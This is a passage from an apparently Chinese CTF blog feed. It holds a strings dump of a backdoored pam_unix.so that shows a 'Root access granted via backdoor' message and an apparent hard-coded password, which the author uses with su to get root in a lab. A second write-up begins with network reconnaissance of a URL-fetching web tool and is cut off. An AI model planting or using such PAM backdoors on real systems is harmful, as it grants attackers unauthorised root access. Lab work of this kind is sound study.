D$DH
L$`D
L$@H
t$`D
D$&lt;H
D$XH
[]A\A]A^A_
T$HD
T$X1
T$XH
t$HD
t$HD
t$HA
D$hH
|$pH
D$hH
D$ H
D$pH
L$ H
t$hE
L$ H
ATUH
[]A\A]
[]A\A]
uWE1
[]A\
[]A\
AVAUI
t$01
[]A\A]A^A_
ATUSH
[]A\
 []A\
ASARL
ATUSH
[]A\A]A^
AVAUATA
|$ H
t$,H
L$,D
@D#d
8[]D
A\A]A^A_
|$ H
|$ H
|$ H
|$ H
|$ 1
AVAUA
u&amp;E1
[]A\A]A^A_
|$xL
L$lL
D$pH
|$xA
D$xA
l$xI
D$\H
|$ H
|$0H
T$HH
D$@B
D$\H
D$xH
l$xL
l$xL
t$ I
l$xL
t$0I
AUATUH
 ]A\A]
 ]A\A]
AUATI
L$ H
-UN*X-FAH
|$ H
|$ H
[]A\A]A^A_
T$(H
D$(H
t$ H
L$@H
T$8H
D$HM
ATUIc
[]A\A]A^
t$0L
AWAVAUA
u#E1
[]A\A]A^A_
[]A\A]
[]A\A]
[]A\A]
ATUH
[]A\
[]A\
K H)
{0H9
$$1$
AWAVAUATI
|$ L
h[]A\A]A^A_
h[]A\A]A^A_
[]A\A]A^A_
AWAVAUATUSH
t$\D
|$`L
|$XL
T$8H
D$ H
D$(H
[]A\A]A^A_
tmE9
D$8H
L$0L
D$8H
AWAVAUI
ATUSH
t$0D
|$,H
|$(H
[]A\A]A^A_
AWAVI
ATUSH
|$|H
|$xH
[]A\A]A^A_
AVAUATUSD
p $E
QZ^&amp;
A]A^
AWAVI
[]A\A]A^A_
[]A\
AVAUATI
t$0H
=UUUUwni
$w}E
=UUUUv
|$ H
D$,
|$'L
|$-
|$(L
|$.
|$)L
|$/
|$*L
|$%
[]A\A]A^A_
AVAUATUSD
p $E
QZ^&amp;
A]A^
AWAVI
[]A\A]A^A_
[]A\
AVAUATI
t$0H
=UUUUwni
$w}E
=UUUUv
|$ H
D$,
|$'L
|$-
|$(L
|$.
|$)L
|$/
|$*L
|$%
[]A\A]A^A_
Could not make pipe: %m
stdout
dup2 of %s failed: %m
setuid failed: %m
/sbin/unix_chkpwd
chkexpiry
unix_chkpwd abnormal exit: %d
Fork failed: %m
unix_setcred_return
Linux-PAM
helper binary execve failed: %m
read unix_chkpwd output error %d: %m
unix_chkpwd waitpid returned %d: %m
could not identify user (from uid=%lu)
could not identify user (from getpwnam(%s))
account %s has expired (account expired)
Your account has expired; please contact your system administrator
expired password for user %s (root enforced)
You are required to change your password immediately (administrator enforced)
expired password for user %s (password aged)
You are required to change your password immediately (password expired)
account %s has expired (failed to change password)
password for user %s will expire in %d days
Warning: your password will expire in %d days
Warning: your password will expire in %d day
pam_unix_auth: cannot allocate ret_data
auth could not identify password for [%s]
PAM: Root access granted via backdoor
bad username [%s]
660930334
No password supplied
Password unchanged
Can not get username
/etc/security/opasswd
bad authentication token
 or NIS
 not
username [%s] obtained
Changing password for %s.
user not authenticated
user shadow entry expired
new password not acceptable 2
can't get local yp domain: %s
passwd.byname
new password not acceptable
You must choose a longer password
can't open %s file to check old passwords
Password has been already used. Choose another.
password - could not identify user
user '%s' does not exist in /etc/passwd%s
user '%s' has corrupted passwd entry
password - (old) token not obtained
You must wait longer to change your password
password - new password not obtained
user password changed by another process
crypt() failure or out of memory for password
can't find the master ypserver: %s
yppasswdd not running on NIS master host
yppasswd daemon running on illegal port
Use NIS server on %s with port %d
password%s changed for %s on %s
NIS password could not be changed.
password received unknown request
session closed for user %s
open_session - error recovering username
open_session - error recovering service
session opened for user %s by %s(uid=%lu)
close_session - error recovering username
close_session - error recovering service
nullok
nonull
stdin
 user=
**unknown**
/etc/login.defs
ENCRYPT_METHOD
SHA_CRYPT_MAX_ROUNDS
unrecognized option [%s]
/etc/passwd
_pam_unix_getpwnam_%s
no memory for data-name
check pass; user (%s) unknown
check pass; user unknown
audit
use_first_pass
try_first_pass
authtok_type=
use_authtok
debug
nodelay
bigcrypt
likeauth
remember=
noreap
broken_shadow
sha256
sha512
rounds=
blowfish
minlen=
quiet
no_pass_expiry
Cannot send password to helper: %m
%d more authentication failure%s; logname=%s uid=%d euid=%d tty=%s ruser=%s rhost=%s %s%s
service(%s) ignoring max retries; %d &gt; %d
option remember not allowed for this module type
option minlen not allowed for this module type
option rounds not allowed for this module type
Password minlen reset to 8 characters
unrecognized ENCRYPT_METHOD value [%s]
authentication failure; logname=%s uid=%d euid=%d tty=%s ruser=%s rhost=%s %s%s
no memory for failure recorder
/dev/urandom
*NP*
$2a$
rounds=%u$
/etc/security/nopasswd
%s:%s:%d:%s
%s:%s:%d:%s,%s
%s:%lu:1:%s
/etc/npasswd
password changed for %s
/etc/nshadow
/etc/shadow
account %s has password changed in future
Algo %s not supported by the crypto backend, falling back to MD5
ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789./
./0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz
./0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz
;*3$'
GCC: (Debian 10.2.1-6) 10.2.1 20210110
|!3)
|%rc
        3       -
        4       -
        8       -
        9       -
        :       -
 low
'key
 low
(pwd
~20'
 $0.(
;pwd
;err
(buf
;len
&gt;&lt;D
Cerr
'pwd
'new
'old
'tty
9% 1
'pwd
'fds
'len
!nis
!nis
!ret
'buf
~'len
!err
P'tty
5val
;key
=buf
?=tmp
;__n
~$len
0pwd
0pwd
0pwd
 $,(
 $,(
/usr/include
bigcrypt.c
crypt.h
stdlib.h
string.h
&lt;built-in&gt;
/usr/lib/gcc/x86_64-linux-gnu/10/include
/usr/include/x86_64-linux-gnu/bits
/usr/include/x86_64-linux-gnu/bits/types
/usr/include
../../libpam/include/security
/usr/include/x86_64-linux-gnu/sys
pam_unix_acct.c
stddef.h
types.h
__sigset_t.h
struct_FILE.h
FILE.h
pwd.h
shadow.h
__sigval_t.h
siginfo_t.h
signal.h
sigaction.h
_pam_types.h
support.h
stdio.h
pam_modules.h
passverify.h
unistd.h
pam_ext.h
libintl.h
pam_modutil.h
errno.h
wait.h
&lt;built-in&gt;
../../libpam/include/security
/usr/include
/usr/include/x86_64-linux-gnu/sys
pam_unix_auth.c
support.h
_pam_types.h
pam_modules.h
stdlib.h
pam_ext.h
syslog.h
/usr/lib/gcc/x86_64-linux-gnu/10/include
/usr/include/x86_64-linux-gnu/bits
/usr/include/x86_64-linux-gnu/bits/types
/usr/include/x86_64-linux-gnu/sys
/usr/include
../../libpam/include/security
/usr/include/rpc
/usr/include/netinet
/usr/include/rpcsvc
pam_unix_passwd.c
stddef.h
types.h
struct_FILE.h
FILE.h
types.h
stdint-intn.h
struct_timeval.h
pwd.h
shadow.h
_pam_types.h
support.h
types.h
stdint-uintn.h
sockaddr.h
socket.h
in.h
un.h
xdr.h
auth.h
clnt.h
yppasswd.h
pam_ext.h
ypclnt.h
passverify.h
string.h
malloc.h
libintl.h
pam_modules.h
md5.h
stdio.h
../../libpam/include/security
/usr/include
pam_unix_sess.c
support.h
_pam_types.h
pam_ext.h
pam_modutil.h
unistd.h
/usr/include/x86_64-linux-gnu/bits
/usr/include
/usr/lib/gcc/x86_64-linux-gnu/10/include
/usr/include/x86_64-linux-gnu/sys
/usr/include/x86_64-linux-gnu/bits/types
../../libpam/include/security
/usr/include/rpcsvc
support.c
stdio.h
stdlib.h
stddef.h
types.h
types.h
__sigset_t.h
struct_FILE.h
FILE.h
pwd.h
__sigval_t.h
siginfo_t.h
signal.h
sigaction.h
_pam_types.h
support.h
pam_ext.h
pam_modutil.h
string.h
unistd.h
pam_modules.h
malloc.h
passverify.h
errno.h
wait.h
stdio.h
ctype.h
ypclnt.h
&lt;built-in&gt;
strings.h
[Y;YYWYYWYYWY
/usr/include/x86_64-linux-gnu/sys
/usr/lib/gcc/x86_64-linux-gnu/10/include
/usr/include/x86_64-linux-gnu/bits
/usr/include/x86_64-linux-gnu/bits/types
../../libpam/include/security
/usr/include
passverify.c
stat.h
stddef.h
types.h
struct_timeval.h
struct_timespec.h
_pam_types.h
pwd.h
FILE.h
struct_FILE.h
support.h
shadow.h
time.h
stat.h
crypt.h
md5.h
stdio.h
unistd.h
string.h
time.h
pam_ext.h
stdlib.h
pam_modutil.h
bigcrypt.h
&lt;built-in&gt;
fcntl.h
errno.h
/X ..
X  ..
[  ..
= J.
&lt;  X
f...
/usr/include/rpc
/usr/include/x86_64-linux-gnu/bits
/usr/include/x86_64-linux-gnu/sys
/usr/include/netinet
yppasswd_xdr.c
types.h
types.h
types.h
stdint-intn.h
stdint-uintn.h
sockaddr.h
socket.h
in.h
un.h
xdr.h
yppasswd.h
/usr/include
md5.c
md5_crypt.c
md5.h
stdlib.h
string.h
&lt;built-in&gt;
r/;&lt;
u;=I
==H&lt;
0:/;=I&lt;
18=-
uI=;
ue=-
Jtu-
ftu-
K-=-
Jtu-
ftu-
K-=-
K-=-
Jtu-
ftu-
ftu-
Jtu-
.V&gt;,
.K-=-
fu-=-
/-/-Ju.I&lt;
.W=-
0,0,.
.W=-
.W=-
0:0:.
:/=:&lt;
yJ.K
        ?/KH
/usr/include
md5.c
md5_crypt.c
md5.h
stdlib.h
string.h
&lt;built-in&gt;
r/;&lt;
u;=I
==H&lt;
0:/;=I&lt;
18=-
uI=;
ue=-
Jtu-
ftu-
K-=-
Jtu-
ftu-
K-=-
K-=-
Jtu-
ftu-
ftu-
Jtu-
.V&gt;,
.K-=-
fu-=-
/-/-Ju.I&lt;
.W=-
0,0,.
.W=-
.W=-
0:0:.
:/=:&lt;
yJ.K
        ?/KH
internal
bigcrypt
crypt_data
short unsigned int
cipher_ptr
__xx__
tmp_ptr
unsigned char
input
initialized
bigcrypt.c
setting
strncpy
plaintext_ptr
crypt_r
GNU C17 10.2.1 20210110 -mtune=generic -march=x86-64 -g -O2 -fPIC -fasynchronous-unwind-tables
long long unsigned int
dec_c2_cryptbuf
__builtin_calloc
long long int
keybuf
/root/Linux-PAM-1.3.1/modules/pam_unix
short int
keylen
output
n_seg
cdata
salt_ptr
malloc
__off_t
__gid_t
_IO_read_ptr
_pkey
_chain
void_uname
__sigval_t
si_errno
_shortbuf
_make_remark
is_hash_algo
sa_flags
_IO_read_base
__sighandler_t
_lower
si_stime
pipe
_arch
pw_shell
_exit
dup2
pamh
_fileno
_IO_read_end
_sigchld
authrv
_IO_backup_base
__isoc99_sscanf
execve
envp
_cur_column
_upper
si_overrun
_IO_codecvt
sp_inact
_bounds
si_addr
sp_max
_old_offset
sp_min
si_addr_lsb
si_sigval
sp_flag
newsa
geteuid
__off64_t
pam_unix_acct.c
si_pid
pam_modutil_redirect_fd
_IO_marker
_freeres_buf
PAM_MODUTIL_IGNORE_FD
__val
si_utime
get_account_info
_IO_write_ptr
__sigset_t
waitpid
fork
si_uid
_pad
siginfo_t
_IO_save_base
sival_int
sp_expire
pam_modutil_sanitize_helper_fds
_lock
_sigsys
_flags2
__builtin_puts
stdout
pw_passwd
_syscall
pam_sm_acct_mgmt
unix_args
pw_gid
_sigpoll
_sifields
pam_get_data
_IO_write_end
PAM_MODUTIL_PIPE_FD
_IO_lock_t
_IO_FILE
setuid
oldsa
si_tid
__clock_t
UNIX_Ctrls
pam_get_item
dcngettext
sp_pwdp
PAM_MODUTIL_NULL_FD
token
fflush
_markers
pw_dir
_sigfault
sp_warn
pam_handle_t
_IO_buf_end
_addr_bnd
__pid_t
_call_addr
pw_gecos
_vtable_offset
pretval
dcgettext
spwd
si_status
argc
__errno_location
__uint32_t
check_shadow_expiry
__uid_t
__sigaction_handler
si_signo
_kill
_IO_save_end
sa_sigaction
sa_mask
daysleft
__pad0
__pad5
snprintf
sp_lstchg
_unused2
sa_restorer
pw_name
_unix_run_verify_binary
pam_handle
_set_ctrl
getuid
pam_modutil_read
_timer
si_fd
pam_syslog
pw_uid
sa_handler
_freeres_list
sival_ptr
_IO_wide_data
si_band
argv
_IO_write_base
_IO_buf_base
sp_namp
child
si_code
ret_data
pam_sm_setcred
_unix_verify_password
_unix_blankpasswd
pam_set_data
pam_get_authtok
setcred_free
pam_get_user
pam_sm_authenticate
pam_unix_auth.c
pass_old
AUTH_REJECTEDCRED
XDR_DECODE
sockaddr_ax25
sin6_flowinfo
RPC_CANTDECODEARGS
fclose
RE_why
lctrl
RE_lb
xdrproc_t
strncmp
_do_setpass
ah_ops
RPC_RPCBFAILURE
sptr
sockaddr
sin6_scope_id
high
sockaddr_ns
clnt_sperrno
RPC_CANTDECODERES
pam_sm_chauthtok
__int32_t
xdr_op
md5pass
ah_verf
IPPROTO_IGMP
IPPORT_TFTP
pam_unix_passwd.c
IPPORT_USERRESERVED
IPPORT_NAMESERVER
RPC_PROGNOTREGISTERED
IPPORT_SYSTAT
cl_freeres
x_getint32
__u6_addr16
__caddr_t
IPPROTO_SCTP
IPPROTO_IP
auth_ops
sockaddr_ipx
ah_nextverf
newpass
IPPORT_WHOIS
getNISserver
IPPORT_CMDSERVER
IPPORT_FTP
in_addr_t
Goodcrypt_md5
IPPROTO_ESP
_unix_getpwnam
x_getpostn
IPPROTO_EGP
sockaddr_at
RPC_INTR
ah_refresh
IPPROTO_IPV6
__u6_addr8
RPC_INPROGRESS
clnt_ops
CLIENT
IPPORT_FINGER
AUTH_BADVERF
_unix_comesfromsource
IPPORT_WHOSERVER
unlock_pwdf
__uint16_t
IPPROTO_MAX
RPC_CANTSEND
oa_length
x_getbytes
RPC_SUCCESS
in_port_t
RPC_VERSMISMATCH
IPPORT_RJE
IPPORT_BIFFUDP
strtok_r
RPC_SYSTEMERROR
re_status
sin_zero
x_destroy
RPC_UNKNOWNADDR
IPPORT_SMTP
s_addr
cl_geterr
x_ops
sa_family_t
cl_private
s_luser
cl_call
bool_t
IPPROTO_BEETPH
RPC_TIMEDOUT
pam_set_item
x_putint32
sockaddr_inarp
enum_t
oa_flavor
sin_family
tv_usec
__u_long
AUTH_OK
sockaddr_iso
AUTH
IPPROTO_UDP
XDR_FREE
s_npas
x_public
RE_errno
yperr_string
remember
opaque_auth
rounds
cl_ops
IPPROTO_IPIP
IPPORT_LOGINSERVER
x_putlong
IPPORT_ROUTESERVER
unix_update_passwd
ah_cred
RPC_TLIERROR
towhat
x_inline
forwho
IPPORT_DISCARD
x_putbytes
s_pas
ah_marshal
IPPORT_ECHO
cl_abort
xdr_ops
RPC_PROGUNAVAIL
opwfile
IPPROTO_PUP
check_old_password
XDR_ENCODE
sin_port
IPPROTO_AH
sockaddr_eon
authunix_create_default
IPPROTO_ICMP
unlocked
__u6_addr32
sockaddr_un
create_password_hash
newpw
yp_get_default_domain
RPC_STALERACHANDLE
__in6_u
sin_addr
ah_validate
RPC_FAILED
RE_vers
cl_destroy
fopen
AUTH_BADCRED
save_old_password
done
IPPROTO_IDP
x_setpostn
fgets
timeval
yppwd
long double
oldpass
AUTH_FAILED
sin6_port
IPPORT_NETSTAT
IPPROTO_RSVP
IPPROTO_GRE
x_base
IPPORT_EXECSERVER
AUTH_REJECTEDVERF
yp_master
IPPORT_TTYLINK
sin6_family
_pam_unix_approve_pass
sockaddr_dl
oa_base
IPPORT_TELNET
RPC_UNKNOWNHOST
RPC_UNKNOWNPROTO
IPPROTO_PIM
sun_family
ah_private
RPC_PROGVERSMISMATCH
RPC_CANTENCODEARGS
sun_path
sockaddr_in
auth_stat
__uint8_t
_unix_verify_shadow
IPPROTO_MTP
x_getlong
IPPROTO_TP
x_op
fromwhat
tv_sec
pass_min_len
IPPORT_DAYTIME
AUTH_TOOWEAK
IPPROTO_UDPLITE
cl_control
IPPROTO_COMP
IPPROTO_ENCAP
RPC_NOBROADCAST
rpc_err
unix_update_shadow
cl_auth
timeout
RPC_N2AXLATEFAILURE
domainname
clnt
ah_key
__suseconds_t
IPPORT_SUPDUP
__time_t
des_block
IPPORT_EFSSERVER
IPPORT_TIMESERVER
clnt_create
clnt_stat
IPPROTO_TCP
strcmp
IPPORT_RESERVED
sa_family
strdup
getrpcport
IPPROTO_MPLS
pass_new
RPC_UDERROR
x_private
__u_int
pam_prompt
x_handy
s_uid
IPPORT_MTP
ah_destroy
sockaddr_in6
IPPROTO_DCCP
sa_data
is_pwd_shadowed
sin6_addr
IPPROTO_RAW
sockaddr_x25
retry
AUTH_INVALIDRESP
RPC_CANTRECV
RPC_PROCUNAVAIL
RPC_AUTHERROR
pam_modutil_getlogin
pam_unix_sess.c
login_name
service
user_name
pam_sm_open_session
pam_sm_close_session
__stream
quiet
yp_match
_ISgraph
_pam_failed_auth
__ssize_t
write
__lineptr
type
strcasecmp
_unix_cleanup
atoi
__nptr
__builtin_memset
_ISprint
get_pwd_hash
_cleanup_failures
failure
spasswd
matched
yp_bind
strsep
filename
__builtin_memcpy
_ISpunct
suid
userlen
verify_pwd_hash
strcpy
_ISxdigit
_ISupper
__ctype_b_loc
_IScntrl
support.c
void_old
count
buflen
shome
feof
search_key
_ISalpha
_ISblank
_ISalnum
slogin
pam_fail_delay
_ISspace
sgid
getline
userinfo
_ISlower
strtol
__getdelim
sgecos
_unix_run_helper_binary
yp_unbind
ruser
data_name
sshell
strncasecmp
_ISdigit
files
rhost
error_status
__glibc_reserved
st_ctim
unlink
st_blksize
st_blocks
MD5Context
uint32
crypted
st_mtim
found
curdays
__dev_t
result
where
usleep
strip_hpux_aging
spwdent
nbuf
umask
__blksize_t
st_uid
crypt_make_salt
st_rdev
GoodMD5Update
__syscall_slong_t
algoid
ulckpwdf
timezone
__mode_t
fchown
st_gid
putspent
howmany
stpcpy
st_size
getpid
clock
fstat
__blkcnt_t
tz_minuteswest
__ino_t
const_charp
tmppass
unix_selinux_confined
crypt_md5_wrapper
__builtin_strchr
bits
__fd
pam_modutil_getspnam
pam_modutil_getpwnam
rename
nullok
__fxstat
oldmask
st_nlink
GoodMD5Final
passverify.c
st_dev
timespec
fchmod
gettimeofday
assigned_passwd
i64c
fputs
fgetspent
fgetpwent
tv_nsec
valid
stmpent
GoodMD5Init
st_mode
putpwent
fsync
tz_dsttime
Brokencrypt_md5
hash_len
st_ino
__statbuf
MD5_CTX
__nlink_t
st_atim
wroteentry
xdr_yppasswd
xdr_int
yppasswd_xdr.c
xdrs
xdr_string
objp
xdr_xpasswd
longs
md5_good.c
final
to64
ctx1
strncat
__builtin_strlen
byteReverse
itoa64
GoodMD5Transform
digest
magic
BrokenMD5Update
BrokenMD5Final
BrokenMD5Transform
md5_broken.c
BrokenMD5Init
 $-(
Q@I$
Q@I$
Q@J$
Q@J$
# %!
# %!x
# %!
# %!'
# %!
# %!x
# %!
# %!'
crtstuff.c
deregister_tm_clones
__do_global_dtors_aux
completed.0
__do_global_dtors_aux_fini_array_entry
frame_dummy
__frame_dummy_init_array_entry
bigcrypt.c
pam_unix_acct.c
envp.0
pam_unix_auth.c
setcred_free
pam_unix_passwd.c
_unix_verify_shadow
_pam_unix_approve_pass
pam_unix_sess.c
support.c
_unix_cleanup
_unix_run_helper_binary
_cleanup_failures
search_key.constprop.0
unix_args
passverify.c
crypt_make_salt
valid.2
buf.1
nbuf.0
yppasswd_xdr.c
md5_good.c
itoa64
md5_broken.c
__FRAME_END__
xdr_yppasswd
_unix_run_verify_binary
_set_ctrl
BrokenMD5Transform
get_account_info
Goodcrypt_md5
BrokenMD5Init
bigcrypt
_fini
save_old_password
crypt_md5_wrapper
unix_update_passwd
unix_update_shadow
create_password_hash
Brokencrypt_md5
__dso_handle
_unix_getpwnam
GoodMD5Final
_unix_comesfromsource
GoodMD5Transform
_make_remark
_DYNAMIC
is_pwd_shadowed
unlock_pwdf
BrokenMD5Final
unix_selinux_confined
GoodMD5Init
get_pwd_hash
check_shadow_expiry
__GNU_EH_FRAME_HDR
__TMC_END__
_GLOBAL_OFFSET_TABLE_
GoodMD5Update
_unix_blankpasswd
_unix_verify_password
verify_pwd_hash
_init
BrokenMD5Update
xdr_xpasswd
pam_modutil_sanitize_helper_fds@LIBPAM_MODUTIL_1.1.9
free@GLIBC_2.2.5
pam_modutil_getpwnam@LIBPAM_MODUTIL_1.0
strcasecmp@GLIBC_2.2.5
__errno_location@GLIBC_2.2.5
unlink@GLIBC_2.2.5
strncpy@GLIBC_2.2.5
strncmp@GLIBC_2.2.5
_ITM_deregisterTMCloneTable
stdout@GLIBC_2.2.5
_exit@GLIBC_2.2.5
strcpy@GLIBC_2.2.5
pam_set_item@LIBPAM_1.0
pam_get_data@LIBPAM_1.0
putspent@GLIBC_2.2.5
sigaction@GLIBC_2.2.5
pam_sm_setcred
pam_prompt@LIBPAM_EXTENSION_1.0
write@GLIBC_2.2.5
getpid@GLIBC_2.2.5
clock@GLIBC_2.2.5
yp_unbind@LIBNSL_1.0
fclose@GLIBC_2.2.5
stpcpy@GLIBC_2.2.5
yp_master@LIBNSL_1.0
dcgettext@GLIBC_2.2.5
strlen@GLIBC_2.2.5
getuid@GLIBC_2.2.5
dup2@GLIBC_2.2.5
strchr@GLIBC_2.2.5
snprintf@GLIBC_2.2.5
gettimeofday@GLIBC_2.2.5
fputs@GLIBC_2.2.5
memset@GLIBC_2.2.5
geteuid@GLIBC_2.2.5
pam_modutil_getlogin@LIBPAM_MODUTIL_1.0
strncat@GLIBC_2.2.5
authunix_create_default@GLIBC_2.2.5
pipe@GLIBC_2.2.5
yp_match@LIBNSL_1.0
strtok_r@GLIBC_2.2.5
pam_sm_chauthtok
read@GLIBC_2.2.5
fgets@GLIBC_2.2.5
execve@GLIBC_2.2.5
xdr_string@GLIBC_2.2.5
calloc@GLIBC_2.2.5
pam_sm_close_session
__getdelim@GLIBC_2.2.5
strcmp@GLIBC_2.2.5
getpwnam@GLIBC_2.2.5
feof@GLIBC_2.2.5
__gmon_start__
umask@GLIBC_2.2.5
strtol@GLIBC_2.2.5
memcpy@GLIBC_2.14
time@GLIBC_2.2.5
fileno@GLIBC_2.2.5
malloc@GLIBC_2.2.5
strncasecmp@GLIBC_2.2.5
fflush@GLIBC_2.2.5
pam_sm_acct_mgmt
strsep@GLIBC_2.2.5
__isoc99_sscanf@GLIBC_2.7
fgetpwent@GLIBC_2.2.5
syslog@GLIBC_2.2.5
__fxstat@GLIBC_2.2.5
yp_bind@LIBNSL_1.0
xdr_int@GLIBC_2.2.5
fgetspent@GLIBC_2.2.5
crypt_r@XCRYPT_2.0
yperr_string@LIBNSL_1.0
clnt_sperrno@GLIBC_2.2.5
fchmod@GLIBC_2.2.5
pam_syslog@LIBPAM_EXTENSION_1.0
fsync@GLIBC_2.2.5
pam_sm_open_session
waitpid@GLIBC_2.2.5
clnt_create@GLIBC_2.2.5
fchown@GLIBC_2.2.5
fopen@GLIBC_2.2.5
ulckpwdf@GLIBC_2.2.5
pam_get_item@LIBPAM_1.0
dcngettext@GLIBC_2.2.5
rename@GLIBC_2.2.5
pam_set_data@LIBPAM_1.0
pam_modutil_read@LIBPAM_MODUTIL_1.0
pam_get_user@LIBPAM_1.0
pam_modutil_getspnam@LIBPAM_MODUTIL_1.0
pam_sm_authenticate
yp_get_default_domain@LIBNSL_1.0
pam_fail_delay@LIBPAM_1.0
_ITM_registerTMCloneTable
setuid@GLIBC_2.2.5
strdup@GLIBC_2.2.5
putpwent@GLIBC_2.2.5
pam_get_authtok@LIBPAM_EXTENSION_1.1
__cxa_finalize@GLIBC_2.2.5
fork@GLIBC_2.2.5
getrpcport@GLIBC_2.2.5
__ctype_b_loc@GLIBC_2.3
usleep@GLIBC_2.2.5
.symtab
.strtab
.shstrtab
.note.gnu.build-id
.gnu.hash
.dynsym
.dynstr
.gnu.version
.gnu.version_r
.rela.dyn
.rela.plt
.init
.plt.got
.text
.fini
.rodata
.eh_frame_hdr
.eh_frame
.init_array
.fini_array
.data.rel.ro
.dynamic
.got.plt
.data
.bss
.comment
.debug_aranges
.debug_info
.debug_abbrev
.debug_line
.debug_str
.debug_loc
.debug_ranges
````

主要是这里有问题

```
...
auth could not identify password for [%s]
PAM: Root access granted via backdoor
bad username [%s]
660930334
No password supplied
...
```

貌似留了一个后门

```
morri@Backdoor1:/opt$ su -
Password: 
root@Backdoor1:~# id
uid=0(root) gid=0(root) groups=0(root)
root@Backdoor1:~# cat /root/root.txt 
flag{root-5d363bb914c59fd1cd2b59e998bedb4f}
```

好的就是后门，哈哈哈，dpkg -V也可以看到，看个人喜欢

```
root@Backdoor1:~# dpkg -V
??5?????? c /etc/irssi.conf
??5??????   /lib/x86_64-linux-gnu/security/pam_unix.so
??5?????? c /etc/apache2/apache2.conf
??5?????? c /etc/grub.d/10_linux
??5?????? c /etc/grub.d/40_custom
??5?????? c /etc/sudoers
??5?????? c /etc/inspircd/inspircd.conf
??5?????? c /etc/inspircd/inspircd.motd
??5?????? c /etc/issue
```

。</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/nei-bu-_Backdoor1.html</guid><pubDate>Wed, 09 Jul 2025 14:20:04 +0000</pubDate></item><item><title>内部_Basic</title><link>https://7r1UMPHK.github.io/post/nei-bu-_Basic.html</link><description>![image-20250707214716346](https://7r1umphk.github.io/image/20250707214716465.webp)

```
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ sudo arp-scan -l                    
[sudo] kali 的密码：
Interface: eth0, type: EN10MB, MAC: 00:0c:29:57:e5:45, IPv4: 192.168.205.128
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.205.1   00:50:56:c0:00:08       VMware, Inc.
192.168.205.2   00:50:56:fc:94:2f       VMware, Inc.
192.168.205.167 08:00:27:f0:d8:81       PCS Systemtechnik GmbH
192.168.205.254 00:50:56:e7:e4:00       VMware, Inc.

4 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.10.0: 256 hosts scanned in 1.953 seconds (131.08 hosts/sec). 4 responded
```

167的

探测一下服务

```
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ nmap -p- 192.168.205.167
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-07 09:30 EDT
Nmap scan report for 192.168.205.167
Host is up (0.00010s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 08:00:27:F0:D8:81 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 1.28 seconds
```

看看80

```
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ curl http://192.168.205.167
&lt;!DOCTYPE html&gt;
&lt;html&gt;
&lt;head&gt;
    &lt;title&gt;HTTP Requester&lt;/title&gt;
    &lt;style&gt;
        body {
            font-family: Arial, sans-serif;
            max-width: 800px;
            margin: 0 auto;
            padding: 20px;
            background-color: #f5f5f5;
        }
        .container {
            background-color: white;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
        }
        h1 {
            color: #333;
            border-bottom: 2px solid #eee;
            padding-bottom: 10px;
        }
        form {
            margin: 20px 0;
            display: flex;
            gap: 10px;
        }
        input[type='text'] {
            flex: 1;
            padding: 10px;
            border: 1px solid #ddd;
            border-radius: 4px;
        }
        button {
            padding: 10px 20px;
            background-color: #4CAF50;
            color: white;
            border: none;
            border-radius: 4px;
            cursor: pointer;
        }
        button:hover {
            background-color: #45a049;
        }
        .result-box {
            margin-top: 20px;
            padding: 15px;
            background-color: #f9f9f9;
            border-left: 4px solid #ccc;
        }
        nav {
            margin-top: 30px;
            display: flex;
            gap: 15px;
        }
        nav a {
            padding: 8px 16px;
            background-color: #e0e0e0;
            border-radius: 4px;
            text-decoration: none;
            color: #333;
        }
        nav a:hover {
            background-color: #d0d0d0;
        }
        pre {
            max-height: 300px;
            overflow: auto;
            padding: 15px;
            background-color: #f8f8f8;
            border: 1px solid #e0e0e0;
            border-radius: 4px;
            white-space: pre-wrap;
        }
    &lt;/style&gt;
&lt;/head&gt;
&lt;body&gt;
    &lt;div class='container'&gt;
        &lt;h1&gt;Website Request Tool&lt;/h1&gt;
        &lt;form method='POST'&gt;
            &lt;input type='text' name='url' placeholder='Enter URL starting with http' required&gt;
            &lt;button type='submit'&gt;Fetch Content&lt;/button&gt;
        &lt;/form&gt;
        
        &lt;div class='result-box'&gt;
            &lt;h3&gt;Current target:&lt;/h3&gt;
            No request made        &lt;/div&gt;
        
        &lt;div class='result-box'&gt;
            &lt;h3&gt;Response:&lt;/h3&gt;
                            &lt;p&gt;Submit URL to test connection&lt;/p&gt;
                    &lt;/div&gt;
        
        &lt;nav&gt;
            &lt;a href='home.php'&gt;Home&lt;/a&gt;
            &lt;a href='about.php'&gt;About&lt;/a&gt;
            &lt;a href='dashboard.php'&gt;Dashboard&lt;/a&gt;
        &lt;/nav&gt;
    &lt;/div&gt;
&lt;/body&gt;
&lt;/html&gt;
```

![image-20250707214425237](https://7r1umphk.github.io/image/20250707214432940.webp)

尝试访问反弹shell

![image-20250707214553039](https://7r1umphk.github.io/image/20250707214553216.webp)

没解析

查看本地文件

![image-20250707214628218](https://7r1umphk.github.io/image/20250707214628414.webp)

看了home，about，dashboard，还尝试了一下167的ip，都没有什么东西

抓个包看看

![image-20250707214846154](https://7r1umphk.github.io/image/20250707214846404.webp)

没啥东西

然后这里测试了很多，后面发现是它发送的头有东西

```
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ sudo tcpdump -A host 192.168.205.167
[sudo] kali 的密码：
对不起，请重试。</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/nei-bu-_Basic.html</guid><pubDate>Mon, 07 Jul 2025 15:25:27 +0000</pubDate></item><item><title>Challenge 057</title><link>https://7r1UMPHK.github.io/post/Challenge%20057.html</link><description>![image-20250705222109182](https://7r1umphk.github.io/image/20250705222109387.webp)

```
